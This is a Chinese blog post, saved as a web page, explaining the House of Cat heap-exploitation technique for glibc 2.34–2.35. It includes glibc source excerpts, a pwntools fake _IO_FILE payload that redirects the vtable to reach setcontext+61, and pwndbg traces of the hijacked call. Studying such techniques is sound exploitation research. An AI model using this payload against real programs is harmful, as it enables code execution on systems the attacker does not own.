@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="House Of CatHouse of emma 是 glibc-2.34 下常用的攻击手法之一，其利用条件只需任意写一个可控地址就可以控制程序执行流，攻击威力十分强大，但是需要攻击位于 TLS 的 _pointer_chk_guard，并且远程可能需要爆破 TLS 偏移 House of cat 使用了一种新的 IO 链，目前适用于任何版本（包括 glibc-2.35）   House Of">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House Of Cat-原理">
+<meta property="og:url" content="http://example.com/2022/08/08/House%20Of%20Cat-%E5%8E%9F%E7%90%86/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="House Of CatHouse of emma 是 glibc-2.34 下常用的攻击手法之一，其利用条件只需任意写一个可控地址就可以控制程序执行流，攻击威力十分强大，但是需要攻击位于 TLS 的 _pointer_chk_guard，并且远程可能需要爆破 TLS 偏移 House of cat 使用了一种新的 IO 链，目前适用于任何版本（包括 glibc-2.35）   House Of">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-08-08T06:50:55.000Z">
+<meta property="article:modified_time" content="2022-08-08T06:51:47.933Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="House Of Cat">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/08/08/House%20Of%20Cat-%E5%8E%9F%E7%90%86/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>House Of Cat-原理 | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/08/House%20Of%20Cat-%E5%8E%9F%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          House Of Cat-原理
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-08-08 14:50:55 / Modified: 14:51:47" itemprop="dateCreated datePublished" datetime="2022-08-08T14:50:55+08:00">2022-08-08</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>4.6k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>4 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="House-Of-Cat"><a href="#House-Of-Cat" class="headerlink" title="House Of Cat"></a>House Of Cat</h2><p>House of emma 是 glibc-2.34 下常用的攻击手法之一，其利用条件只需任意写一个可控地址就可以控制程序执行流，攻击威力十分强大，但是需要攻击位于 TLS 的 <code>_pointer_chk_guard</code>，并且远程可能需要爆破 TLS 偏移</p>
+<p>House of cat 使用了一种新的 IO 链，目前适用于任何版本（包括 glibc-2.35） </p>
+<hr>
+<h2 id="House-Of-Cat-原理"><a href="#House-Of-Cat-原理" class="headerlink" title="House Of Cat 原理"></a>House Of Cat 原理</h2><p>在 libc-2.34 版本中，常用的 hook 都被 ban 掉了（malloc_hook，free_hook 等），我们要尝试通过控制 IO 来获取 shell</p>
+<p>House of cat 利用了 House of emma 的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过 TLS 上 <code>_pointer_chk_guard</code> 的检测相关的IO函数的调用，转而调用 <code>_IO_wfile_jumps</code> 中的 <code>_IO_wfile_seekoff</code> 函数，然后进入到 <code>_IO_switch_to_wget_mode</code> 函数中来攻击</p>
+<p>应用场景是：</p>
+<ul>
+<li>能够任意写一个可控地址</li>
+<li>能够泄露堆地址和 libc 基址</li>
+<li>能够触发 IO 流（FSOP 或触发 <code>__malloc_assert</code>），执行 IO 相关函数</li>
+</ul>
+<p>我们跟进 <code>_IO_wfile_seekoff</code> ：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="keyword">off64_t</span> offset, <span class="keyword">int</span> dir, <span class="keyword">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">off64_t</span> result;</span><br><span class="line">  <span class="keyword">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="keyword">long</span> <span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">			== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">			   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">      <span class="comment">/* 在此处调用_IO_switch_to_wget_mode */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wfile_seekoff)</span><br></pre></td></tr></table></figure>
+<p>核心调用函数 <code>_IO_switch_to_wget_mode</code> 如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">        <span class="comment">/* 这里会调用_IO_WOVERFLOW,而fp可以被我们控制 */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_switch_to_wget_mode)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>由于 FP_err 可以被我们控制，所以可以利用宏函数 <code>_IO_WOVERFLOW</code> 完成任意代码执行</li>
+</ul>
+<h2 id="House-Of-Cat-利用姿势"><a href="#House-Of-Cat-利用姿势" class="headerlink" title="House Of Cat 利用姿势"></a>House Of Cat 利用姿势</h2><p>利用 largebin attack 劫持 <code>stderr</code> 控制为已知 heap 地址，伪造 FILE 结构体，然后使 top chunk 不足以申请从而调用 <code>sysmalloc</code></p>
+<p>其中在 <code>stderr</code> 中的 fake_IO_FILE 如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0xffff</span>)  <span class="comment"># rax1 </span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xc18</span>-<span class="number">0x68</span>)  <span class="comment">#rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)  <span class="comment">#call addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xb30</span>)  <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2160d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0xb30</span>+<span class="number">0x10</span>)  <span class="comment"># rax2</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>在 vtable 的检测中对具体位置的检测还是比较宽松的，这使得我们可以在一定的范围内对 vtable 表的起始位置进行偏移，使其我们可以通过偏移来调用在 vtable 表中的任意函数</li>
+<li>这里对 vtable 进行偏移，使其可以调用 <code>_IO_wfile_seekoff</code> 函数</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*(struct _IO_FILE_plus*)<span class="number">0x55e88c680b00</span></span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x421</span> &lt;error: Cannot access memory at address <span class="number">0x421</span>&gt;,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0xffff</span> &lt;error: Cannot access memory at address <span class="number">0xffff</span>&gt;,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x55e88c680bb0</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x7fb0ed36ca6d</span> &lt;setcontext+<span class="number">61</span>&gt; <span class="string">&quot;H\213\242\240&quot;</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x0</span>,</span><br><span class="line">    _fileno = <span class="number">0</span>,</span><br><span class="line">    _flags2 = <span class="number">0</span>,</span><br><span class="line">    _old_offset = <span class="number">0</span>,</span><br><span class="line">    _cur_column = <span class="number">0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x55e88c680200</span>,</span><br><span class="line">    _offset = <span class="number">0</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x55e88c680b30</span>,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0</span>,</span><br><span class="line">    _mode = <span class="number">0</span>,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7fb0ed52f0d0</span> &lt;_IO_wfile_jumps+<span class="number">16</span>&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来我们来跟进一下 House Of Cat 的触发流程：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fa0ae8d17d0</span> &lt;_IO_wfile_seekoff&gt;       endbr64 </span><br><span class="line">  <span class="number">0x7fa0ae8d17d4</span> &lt;_IO_wfile_seekoff+<span class="number">4</span>&gt;     push   r15</span><br><span class="line">  <span class="number">0x7fa0ae8d17d6</span> &lt;_IO_wfile_seekoff+<span class="number">6</span>&gt;     mov    r15, rdi</span><br><span class="line">  <span class="number">0x7fa0ae8d17d9</span> &lt;_IO_wfile_seekoff+<span class="number">9</span>&gt;     push   r14</span><br><span class="line">  <span class="number">0x7fa0ae8d17db</span> &lt;_IO_wfile_seekoff+<span class="number">11</span>&gt;    push   r13</span><br></pre></td></tr></table></figure>
+<ul>
+<li>进入 <code>_IO_wfile_seekoff</code>，然后调用 <code>_IO_switch_to_wget_mode</code>： </li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fa0ae8d1838</span> &lt;_IO_wfile_seekoff+<span class="number">104</span>&gt;    call   _IO_switch_to_wget_mode                &lt;_IO_switch_to_wget_mode&gt;</span><br><span class="line">       rdi: <span class="number">0x5618e47bbb00</span> ◂— <span class="number">0x0</span></span><br><span class="line">       rsi: <span class="number">0x7fa0aea2a208</span> ◂— <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span></span><br><span class="line">       rdx: <span class="number">0x5618e47bbbb0</span> ◂— <span class="number">0x0</span></span><br><span class="line">       rcx: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>在这里会 <code>call [rax+0x18]</code> 而 <code>rax</code> 是我们可以控制的（就是 <code>FILE-&gt;_IO_buf_end</code>，是我们人为伪造的）</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0x5620ac902b40</span> ◂— <span class="number">0xffff</span></span><br><span class="line">*RBX  <span class="number">0x0</span></span><br><span class="line"> RCX  <span class="number">0x0</span></span><br><span class="line"> RDX  <span class="number">0x5620ac902bb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x7f6ef7dc9d55</span> &lt;_IO_switch_to_wget_mode+<span class="number">37</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]        &lt;setcontext+<span class="number">61</span>&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>把这里修改为 <code>setcontext+61</code> 进行栈迁移（<code>rdx</code> 也是可以控制的）</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5620ac902b40</span>+<span class="number">0x18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5620ac902b58</span> —▸ <span class="number">0x7f6ef7d99a6d</span> (setcontext+<span class="number">61</span>) ◂— mov    rsp, qword ptr [rdx + <span class="number">0xa0</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5620ac902b60</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">4</span> skipped</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x5620ac902b88</span> —▸ <span class="number">0x5620ac902200</span> ◂— <span class="number">0x200000001</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x5620ac902b90</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>最后利用 House Of Kiwi 中的方式 get shell</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/House-Of-Cat/" rel="tag"><i class="fa fa-tag"></i> House Of Cat</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/08/07/House%20Of%20Emma-2.34-64/" rel="prev" title="House Of Emma-2.34-64">
+      <i class="fa fa-chevron-left"></i> House Of Emma-2.34-64
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/08/08/House%20Of%20Cat-2.35-64/" rel="next" title="House Of Cat-2.35-64">
+      House Of Cat-2.35-64 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Cat"><span class="nav-number">1.</span> <span class="nav-text">House Of Cat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Cat-%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">House Of Cat 原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Cat-%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF"><span class="nav-number">3.</span> <span class="nav-text">House Of Cat 利用姿势</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">130</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">95</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">1.7m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">26:01</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
